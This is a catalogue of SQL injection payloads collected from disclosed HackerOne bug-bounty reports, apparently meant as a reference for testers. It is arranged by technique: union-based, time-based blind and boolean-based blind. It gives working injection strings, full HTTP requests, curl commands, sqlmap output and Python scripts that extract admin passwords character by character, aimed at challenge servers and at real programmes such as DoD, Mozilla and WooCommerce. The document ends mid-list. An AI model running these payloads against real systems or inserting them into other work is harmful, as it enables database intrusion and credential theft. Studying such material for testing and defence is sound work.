# SQL Injection

134 payloads from disclosed reports.

## Union-based SQL injection

### `9819109e`

```
' UNION SELECT "' union select 1,2,'../api/user?username=grinch'#",1,2#
```

— [Invading Grinch Network and Saving Christmas](https://hackerone.com/reports/1065829) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)

### `4436cf7d`

```
' UNION SELECT "' union select 1,2,'../api/user?username=grincha$$%&password=%25'#",1,2#
```

— [Invading Grinch Network and Saving Christmas](https://hackerone.com/reports/1065829) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)

### `40a6cee5`

```
GET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+1,NULL,NULL--+- HTTP/1.1
Host: target.com

[picture from album 1 returned]  <--- THIS IS THE KEY DISCOVERY!!!
```

**Parameter:** `hash`
— [Complete destruction of the Grinch server](https://hackerone.com/reports/1065885) · h1-ctf · [shamollash](https://hackerone.com/shamollash)

### `58784572`

```
https://target.com/r3c0n_server_4fdk59/album?hash=-8436' UNION ALL SELECT NULL,NULL,GROUP_CONCAT(UNION ALL SELECT NULL,NULL,NULL) FROM information_schema.tables WHERE table_name like 'a%'-- -
```

**Parameter:** `hash`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `984276bf`

```
UNION ALL SELECT NULL,NULL,( UNION ALL SELECT NULL,NULL,NULL)-- -
```

— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `57b152be`

```
-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,1 -- -",'12',1-- -
```

**Parameter:** `hash`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `e36372a5`

```
-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/user?username={}%' -- -",'12',1-- -
```

**Parameter:** `hash`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `a4535d1d`

```
-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/user?username=grinchadmin%26password={}%' -- -",'12',1-- -
```

— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `6c066e04`

```
`$images` is the object containing names of images, so server takes names of images and creates a JSON object with `image` and `auth` parameters where in image parameter it adds image name to `r3c0n_server_4fdk59\/uploads\/imagename` and generates auth token for this and converts it to base64.
So, the goal here is to control name of image to achieve the SSRF.
Here nested SQL injection comes in play. The results returned by first query where we can inject contains 3 columns id, hash and name. Her
```

**Parameter:** `id`
— [Successfully took down the Grinch and saved the holidays from being ruined](https://hackerone.com/reports/1067530) · h1-ctf · [shubhamz007](https://hackerone.com/shubhamz007)

### `bf7dc134`

```
And server created auth token for us to perform SSRF.
When I entered something which does not exist on website like above example, I got response as
{F1132665}
Indicating it is performing request and 404 for not found, so by this way we can enumerate valid api endpoints and also when I sent something which is valid like `../api/` page I got response as
{F1132666}
So a blind SSRF, All we have to do based on response codes as described on [api][31] page.
[31]: https://target.com/r3c0n
```

**Parameter:** `id`
— [Successfully took down the Grinch and saved the holidays from being ruined](https://hackerone.com/reports/1067530) · h1-ctf · [shubhamz007](https://hackerone.com/shubhamz007)

### `783bfbdc`

```
Endpoint `user` seems interesting tried to find valid parameters and got 2 valid parameters.(Filtering based on response code if 400 then invalid parameter else valid parameter)
Query used `abc' UNION SELECT "2' UNION SELECT 1,1,'../api/user?parameter=abc' -- -",'1',1-- -`
```

**Parameter:** `id`
— [Successfully took down the Grinch and saved the holidays from being ruined](https://hackerone.com/reports/1067530) · h1-ctf · [shubhamz007](https://hackerone.com/shubhamz007)

### `c656caca`

```
.../r3c0n_server_4fdk59/album?hash=-1' union select 1,2,3 -- -
```

**Parameter:** `hash`
— [Hacky Holidays Writeup](https://hackerone.com/reports/1067835) · h1-ctf · [cardinal](https://hackerone.com/cardinal)

### `b44b5715`

```
https://target.com/r3c0n_server_4fdk59/album?hash=-1' UNION ALL SELECT 1, 2, group_concat(album_id,",",id,",",photo,";\n") from photo-- -
```

**Parameter:** `hash`
— [Hacky Holidays Writeup](https://hackerone.com/reports/1067835) · h1-ctf · [cardinal](https://hackerone.com/cardinal)

### `7e3eb464`

```
.../r3c0n_server_4fdk59/album?hash="-1' UNION ALL SELECT "-1' union all select NULL,NULL,'../api/endpoint'-- -",2,3-- -
```

**Parameter:** `hash`
— [Hacky Holidays Writeup](https://hackerone.com/reports/1067835) · h1-ctf · [cardinal](https://hackerone.com/cardinal)

### `435b0cb5`

```
123' UNION SELECT "' UNION SELECT 1,2,'../api/x'-- ","456","789"--
```

**Parameter:** `hash`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `e6d066bd`

```
1' UNION SELECT "1' ORDER BY 3-- ","456","789" --
```

**Parameter:** `hash`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `cfa09e98`

```
Jfjrir' union select 1,2,3,4 from admin;/*
```

— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `da8235d3`

```
' UNION select 1,NULL,NULL;--
```

**Parameter:** `hash`
— [\[h1ctf-Grinch Networks\] MrR3b00t Saving the Christmas](https://hackerone.com/reports/1068934) · h1-ctf · [d3f4u17](https://hackerone.com/d3f4u17)

### `52e5f4c7`

```
' UNION select 1, NULL, NULL;--
```

**Parameter:** `hash`
— [\[h1ctf-Grinch Networks\] MrR3b00t Saving the Christmas](https://hackerone.com/reports/1068934) · h1-ctf · [d3f4u17](https://hackerone.com/d3f4u17)

### `7d163273`

```
' UNION select null,null,'xyz.jpg'
```

**Parameter:** `album_id`
— [\[h1ctf-Grinch Networks\] MrR3b00t Saving the Christmas](https://hackerone.com/reports/1068934) · h1-ctf · [d3f4u17](https://hackerone.com/d3f4u17)

### `2823a51c`

```
https://target.com/r3c0n_server_4fdk59/album?hash=' UNION SELECT "' UNION select NULL,NULL,'xyz.jpg';--",NULL,NULL;--
```

**Parameter:** `hash`
— [\[h1ctf-Grinch Networks\] MrR3b00t Saving the Christmas](https://hackerone.com/reports/1068934) · h1-ctf · [d3f4u17](https://hackerone.com/d3f4u17)

### `cf1f5b51`

```
select * from photo
where album_id='' and 1=0 union select 1,2,'our_path' --
```

**Parameter:** `album_id`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `7924919c`

```
' and 1=0 union select 0x2720616e6420313d3020756e696f6e2073656c65637420312c322c276f75725f7061746827202d2d20,2,3 --
```

**Parameter:** `album_id`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `b9ce966f`

```
' and 1=0 union select 1 -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `1b7fc751`

```
' and 1=0 union select 1,2 -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `65391dee`

```
' and 1=0 union select 1,2,3 -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `6df21389`

```
' and 1=0 union select 1,2,'our_path' -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `cc245c67`

```
' and 1=0 union select SQLi_2,2,3 -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `16fb9dbd`

```
' and 1=0 union select 1,2,'../../' -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `04079938`

```
a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
```

**Parameter:** `hash`
— [h1-ctf : 12 days of hack holiday writeup](https://hackerone.com/reports/1069175) · h1-ctf · [webhak](https://hackerone.com/webhak)

### `0c6f0fe9`

```
https://target.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
```

**Parameter:** `hash`
— [h1-ctf : 12 days of hack holiday writeup](https://hackerone.com/reports/1069175) · h1-ctf · [webhak](https://hackerone.com/webhak)

### `370adb34`

```
import requests
from bs4 import BeautifulSoup
import base64
import string

charset = string.ascii_lowercase + string.digits

base_url ="https://target.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT \"2' UNION SELECT 1,1,'{}' --+-\",1,1--+-"

def get_username():
    username = ""
    while True:
        found_char_previous_run = False
        for char in charset:
            test_string = username + char
            path = "../api/user?username={}%25".format(test_string)
        
```

**Parameter:** `hash`
— [h1-ctf : 12 days of hack holiday writeup](https://hackerone.com/reports/1069175) · h1-ctf · [webhak](https://hackerone.com/webhak)

### `a1f1238a`

```
sql = `' union all select "3", 3, 'test' -- `;
encodeURI(`https://target.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```

**Parameter:** `hash`
— [First CTF ever!](https://hackerone.com/reports/1069263) · h1-ctf · [eliee](https://hackerone.com/eliee)

### `73821555`

```
// this query assumes the /album first fetches the album id using hash
// and then plugs that album id into a query to fetch any relevant photos
// ie, the photo query's where statement becomes `album_id = 3' union select all 1, 2, 'waffle --
// this in turn will give us another row fetched where the photo url will include waffle
sql = `' union all select "3' union all select 1, 2, 'waffle -- ' -- ", 3, 'test' -- `;
encodeURI(`https://target.com/r3c0n_server_4fdk59/album?hash=${sql}
```

**Parameter:** `hash`
— [First CTF ever!](https://hackerone.com/reports/1069263) · h1-ctf · [eliee](https://hackerone.com/eliee)

### `0d8f9e34`

```
sql = `' union all select "3' union all select 1, 2, '../api/user' -- ", 3, 'test' -- `;
encodeURI(`https://target.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```

**Parameter:** `hash`
— [First CTF ever!](https://hackerone.com/reports/1069263) · h1-ctf · [eliee](https://hackerone.com/eliee)

### `1ea13ac1`

```
sql = `' union all select "3' union all select 1, 2, '../api/user?id=1' -- ", 3, 'test' -- `;
encodeURI(`https://target.com/r3c0n_server_4fdk59/album?hash=${sql}`);
```

**Parameter:** `hash`
— [First CTF ever!](https://hackerone.com/reports/1069263) · h1-ctf · [eliee](https://hackerone.com/eliee)

### `70adfdb4`

```
jdh34k' and 1=0 union all select 1,2,3;--
```

— [How The Hackers Saved Christmas](https://hackerone.com/reports/1069335) · h1-ctf · [nytr0gen](https://hackerone.com/nytr0gen)

### `520198e2`

```
jdh34k' and 1=0 union all select "1' and 1='1",2,3;--
```

**Parameter:** `1`
— [How The Hackers Saved Christmas](https://hackerone.com/reports/1069335) · h1-ctf · [nytr0gen](https://hackerone.com/nytr0gen)

### `77790c10`

```
jdh34k' and 1=0 union all select "1' and 1=0 union all select 4,5,6;--;--",2,3;--
```

— [How The Hackers Saved Christmas](https://hackerone.com/reports/1069335) · h1-ctf · [nytr0gen](https://hackerone.com/nytr0gen)


## Time‑based blind SQL injection using PostgreSQL pg_sleep

### `2378d482`

```
<form action="https://target.com/ukmarketplace/wp-admin/edit.php?post_type=qa_faqs&page=faqpageorder" target="_blank"  method="post" style="display: none;">
            <input type="text" name="btnOrderPages" value="Click to Reorder FAQs" />
            <input type="text" name="hdnfaqpageorder" value="id_8,id_7" />
            <input type="text" name="hdnParentID" value="IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)" />
            <input type="text" name="btnReturnParent" value="1" />
           
```

**Parameter:** `hdnParentID`
— [Multiple vulnerabilities in a WordPress plugin at target.com](https://hackerone.com/reports/135288) · Uber · [0xsyndr0me](https://hackerone.com/0xsyndr0me)

### `f5292e72`

```
<form action="https://target.com/ukmarketplace/wp-admin/edit.php?post_type=qa_faqs&page=faqpageorder" target="_blank"  method="post" style="display: none;">
            <input type="text" name="btnOrderPages" value="Click to Reorder FAQs" />
            <input type="text" name="hdnfaqpageorder" value="id_8,id_7" />
            <input type="text" name="hdnParentID" value="" />
            <input type="text" name="pages" value="IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)" />
            <input typ
```

**Parameter:** `pages`
— [Multiple vulnerabilities in a WordPress plugin at target.com](https://hackerone.com/reports/135288) · Uber · [0xsyndr0me](https://hackerone.com/0xsyndr0me)

### `bf7979dc`

```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1" https://target.com

real	0m4.945s
user	0m0.000s
sys		0m0.063s
```

**Parameter:** `group_id`
— [Time-based Blind SQLi on target.com](https://hackerone.com/reports/198292) · Starbucks · [toctou](https://hackerone.com/toctou)

### `3d730aa9`

```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1" https://target.com

real	0m0.860s
user	0m0.000s
sys		0m0.031s
```

**Parameter:** `group_id`
— [Time-based Blind SQLi on target.com](https://hackerone.com/reports/198292) · Starbucks · [toctou](https://hackerone.com/toctou)

### `2a8d23ee`

```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='5',SLEEP(1),0) AND group_id='1" https://target.com

real	0m4.945s

time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='4',SLEEP(1),0) AND group_id='1" https://target.com

real	0m1.005s
```

**Parameter:** `group_id`
— [Time-based Blind SQLi on target.com](https://hackerone.com/reports/198292) · Starbucks · [toctou](https://hackerone.com/toctou)

### `92e41786`

```
pg_sleep(__30__)--
```

**Parameter:** `t`
— [Blind SQL Injection on DoD Site](https://hackerone.com/reports/242882) · U.S. Dept Of Defense · [mr_r3boot](https://hackerone.com/mr_r3boot)

### `b8e4c5eb`

```
if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*/ => 3.276 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.28 s
if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'"XOR(if(now()=sysdate(),sleep(9),0))OR"*/ => 9.298 s
if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/ => 6.272 s
if(no
```

— [blind sql injection](https://hackerone.com/reports/374027) · Hanno's projects · [geeknik](https://hackerone.com/geeknik)

### `d2cccb31`

```
GET /pubs/get_publications.php?pub_group_id=wrtqvasi10rc19j1'%2b(select*from(select(sleep(5)))a)%2b'&rno86qi4=1 HTTP/1.1
Host: █████
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://█████/pubs/
Accept-Encoding: gzip, deflate, br
Accept
```

**Parameter:** `pub_group_id`
— [SQL Injection in the get_publications.php on the https://█████](https://hackerone.com/reports/489483) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `b09ad1b1`

```
GET /pubs/move_papers.php?pub_group_id=a'%2b(select*from(select(sleep(5)))a)%2b' HTTP/1.1
Host: █████████
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
Cookie: ████
```

**Parameter:** `pub_group_id`
— [SQL Injection in the `move_papers.php` on the https://██████████](https://hackerone.com/reports/491191) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `a663a011`

```
1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK
```

**Parameter:** `search`
— [stripo blog search  SQL Injection](https://hackerone.com/reports/761382) · Stripo Inc · [bluebridsec](https://hackerone.com/bluebridsec)

### `2578fc7c`

```
if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0))OR"*/
```

**Parameter:** `User-Agent`
— [Blind SQL Injection](https://hackerone.com/reports/771215) · U.S. Dept Of Defense · [mido0x0x](https://hackerone.com/mido0x0x)

### `43e07acc`

```
[*] starting @ 21:06:44 /2020-05-03/

[18:05:44] [INFO] parsing HTTP request from 'post'
[18:06:10] [INFO] resuming back-end DBMS 'mysql' 
[18:06:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: login (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: login=admin' AND (SELECT 5206 FROM (SELECT(SLEEP(5)))THtF) AND 'MHhg'='MHhg&pass=admin
---
[18:06:45] [INFO
```

**Parameter:** `login`
— [SQL Injection on the administrator panel](https://hackerone.com/reports/865436) · MTN Group · [z3lox](https://hackerone.com/z3lox)

### `f9e33d36`

```
Parameter: search (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: limit=10&offset=20&organization_id=88822&search=0' AND SLEEP(5) AND 'wRIg' LIKE 'wRIg&sort=
```

**Parameter:** `search`
— [Sql injection on target.com](https://hackerone.com/reports/1039315) · Automattic · [lu3ky-13](https://hackerone.com/lu3ky-13)

### `96227c97`

```
' OR sleep(5)='
```

**Parameter:** `name`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `8d6815be`

```
' or (select sleep(15))-- -
```

**Parameter:** `name`
— [\[h1ctf-Grinch Networks\] MrR3b00t Saving the Christmas](https://hackerone.com/reports/1068934) · h1-ctf · [d3f4u17](https://hackerone.com/d3f4u17)

### `31151a43`

```
+ Tried payload as " or sleep(5) on name area.

**Payloads**
{F1139545}

+ After injecting, submitting the request on quiz area
```

**Parameter:** `name`
— [Hackyholidays \[ h1-ctf\] writeup \[mission:- stop the grinch \]](https://hackerone.com/reports/1069396) · h1-ctf · [kunal94](https://hackerone.com/kunal94)

### `222e19f3`

```
Payload: name=hello' AND (SELECT 7752 FROM (SELECT(SLEEP(5)))EvEg) AND 'jenU'='jenU
```

**Parameter:** `name`
— [Hackyholidays \[ h1-ctf\] writeup \[mission:- stop the grinch \]](https://hackerone.com/reports/1069396) · h1-ctf · [kunal94](https://hackerone.com/kunal94)

### `37b300bf`

```
Payload: **2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)**
```

— [SQL injection located in `███` in POST param `████████` ](https://hackerone.com/reports/1262757) · U.S. Dept Of Defense · [brumens](https://hackerone.com/brumens)

### `6d900e96`

```
https:/██████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
```

— [Blind Sql Injection https:/████████](https://hackerone.com/reports/2020429) · U.S. Dept Of Defense · [codeslayer1337](https://hackerone.com/codeslayer1337)

### `35abb850`

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))--
```

**Parameter:** `invite_code`
— [SQL Injection on target.com via invite_code parameter - Mozilla social inscription](https://hackerone.com/reports/2209130) · Mozilla · [supr4s](https://hackerone.com/supr4s)

### `964d7250`

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(10))--
```

**Parameter:** `invite_code`
— [SQL Injection on target.com via invite_code parameter - Mozilla social inscription](https://hackerone.com/reports/2209130) · Mozilla · [supr4s](https://hackerone.com/supr4s)

### `f5139106`

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(20))--
```

**Parameter:** `invite_code`
— [SQL Injection on target.com via invite_code parameter - Mozilla social inscription](https://hackerone.com/reports/2209130) · Mozilla · [supr4s](https://hackerone.com/supr4s)

### `9bf13a8b`

```
GET /wp-admin/admin.php?page=wc-reports&tab=orders&report=coupon_usage&coupon_codes=')+union+select+1,sleep(10)--+- HTTP/1.1
Host: <host>
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en
```

**Parameter:** `coupon_codes`
— [Woocommerce SQL Injection in WC_Report_Coupon_Usage](https://hackerone.com/reports/3198980) · Automattic · [q5ca](https://hackerone.com/q5ca)


## Boolean-based blind SQL injection using substring enumeration in a URL parameter

### `5766418e`

```
curl -H 'Host: target.com' -H 'Cookie: PHPSESSID=XXXXX' 'https://target.com/████.php?entity_type=restaurant&entity_id=1+or+if(mid(@@version,1,1)=5,1,2)=2%23' -k
```

**Parameter:** `entity_id`
— [\[target.com\] Boolean SQLi - /█████.php](https://hackerone.com/reports/297534) · Eternal · [gerben_javado](https://hackerone.com/gerben_javado) · $1,000.0

### `b154936a`

```
' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) = 113-- -
```

— [Invading Grinch Network and Saving Christmas](https://hackerone.com/reports/1065829) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)

### `88006c95`

```
' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 113-- -
```

— [Invading Grinch Network and Saving Christmas](https://hackerone.com/reports/1065829) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)

### `6172c212`

```
test' AND (ascii(substr((SELECT password FROM quiz.admin LIMIT 0,1),1,1))) = 112--  -
```

— [Invading Grinch Network and Saving Christmas](https://hackerone.com/reports/1065829) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)

### `47d922f3`

```
name=NOME' or 22=1 or '2'='1  ---> There is 0 other player(s) with the same name as you!
name=NOME' or  1=1 or '2'='1  ---> There is 24358 other player(s) with the same name as you
```

**Parameter:** `name`
— [Complete destruction of the Grinch server](https://hackerone.com/reports/1065885) · h1-ctf · [shamollash](https://hackerone.com/shamollash)

### `11647e02`

```
...
[17:19:23] [INFO] POST parameter 'name' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable 
...
Parameter: name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: name=-3268' OR 6136=6136-- ibKa
    Vector: OR [INFERENCE]
```

**Parameter:** `name`
— [Complete destruction of the Grinch server](https://hackerone.com/reports/1065885) · h1-ctf · [shamollash](https://hackerone.com/shamollash)

### `9c4088d4`

```
grinch' or 1=( SELECT 1 FROM information_schema.tables WHERE table_name like 'admin' LIMIT 0,1) -- -
```

— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `123c402f`

```
grinch' or 1=( SELECT 1 FROM information_schema.columns WHERE table_name='admin' AND column_name like 'username%' LIMIT 0,1) -- -
```

— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `b2236cc0`

```
grinch' or 1=( SELECT 1 FROM admin WHERE username like 'admi%' LIMIT 0,1) -- -
```

— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `53130b4f`

```
import requests
 import string

# All the printable characters
chars = string.printable
# Maintaining Session State
session = requests.Session()
final = ""
ct = 0
print("[*] Finding Password ... ")
password = 1
 while ct < 100 :
    ct = 1
    for char in chars:
        sqli="1' or (ascii(substr((select password from admin ) ,{},1))) ={} -- -".format(str(password),ord(char))
        post_parameters = {"name":str(sqli)}
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Ap
```

**Parameter:** `name`
— [Hacky Holidays Writeup](https://hackerone.com/reports/1067835) · h1-ctf · [cardinal](https://hackerone.com/cardinal)

### `233d6b86`

```
admin' AND (length((select table_name from information_schema.tables where table_schema='quiz' limit 0,1))) = 5 --
```

— [Hacky Holidays Writeup](https://hackerone.com/reports/1067835) · h1-ctf · [cardinal](https://hackerone.com/cardinal)

### `a4171ee5`

```
admin' AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="quiz" LIMIT 0,1),1,1))) = 97--
```

— [Hacky Holidays Writeup](https://hackerone.com/reports/1067835) · h1-ctf · [cardinal](https://hackerone.com/cardinal)

### `a7e8dcfe`

```
select count(*) from information_schema.tables where table_schema like "quiz" and table_name like "' + tmp_known + '%" limit 1
```

— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `c60f8c59`

```
select count(*) from information_schema.columns where table_schema like "quiz" and table_name="admin" and column_name like "' + tmp_known + '%" limit 1
```

— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `531ffdb6`

```
select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id") and column_name like "' + tmp_known + '%" limit 1
```

— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `3aa9778e`

```
select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id","password") and column_name like "' + tmp_known + '%" limit 1
```

— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `b324b3fc`

```
'and%20substr(version(),1,1)='2'-- ==> will give you 200 OK
```

— [Blind Based SQL Injection in target.com.money](https://hackerone.com/reports/1107536) · CS Money · [sawmj](https://hackerone.com/sawmj)

### `1809e100`

```
'and%20substr(version(),2,1)='0'-- ==> will give you 200 OK
```

— [Blind Based SQL Injection in target.com.money](https://hackerone.com/reports/1107536) · CS Money · [sawmj](https://hackerone.com/sawmj)

### `21987dea`

```
Parameter: scn (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x5648745a FROM DUAL WHERE 7300=7300 AND 1308=1308)||'

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0
```

**Parameter:** `scn`
— [SQL injection at \[█████████\] \[HtUS\]](https://hackerone.com/reports/1626198) · U.S. Dept Of Defense · [malcolmx](https://hackerone.com/malcolmx)

### `b5b7e40e`

```
Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/523.10.3 (KHTML, like Gecko) Version/3.0.4 Safari/523.10' AND 8074=8074-- KwOG
```

**Parameter:** `User-Agent`
— [Boolen Based Blind Sql Injection Via User Agent in ███.mil](https://hackerone.com/reports/2599826) · U.S. Dept Of Defense · [iamunixtz](https://hackerone.com/iamunixtz)


## Boolean-based SQL injection

### `758a2404`

```
' OR '1'='1
```

— [SQL Injection in ████](https://hackerone.com/reports/419017) · U.S. Dept Of Defense · [arinerron2](https://hackerone.com/arinerron2)

### `80b5f673`

```
grinch' or '1'='1
```

**Parameter:** `name`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `bbb8e515`

```
grinch' or '1'='2
```

**Parameter:** `name`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `920f7864`

```
grinch' AND 1=1;--
```

**Parameter:** `name`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `6dbaa94c`

```
' AND 1=1;--
```

**Parameter:** `hash`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `5d7073e3`

```
' or '1'='2
```

**Parameter:** `hash`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `1cd8d5bd`

```
jdh34k' and 1=1 -- .
```

**Parameter:** `hash`
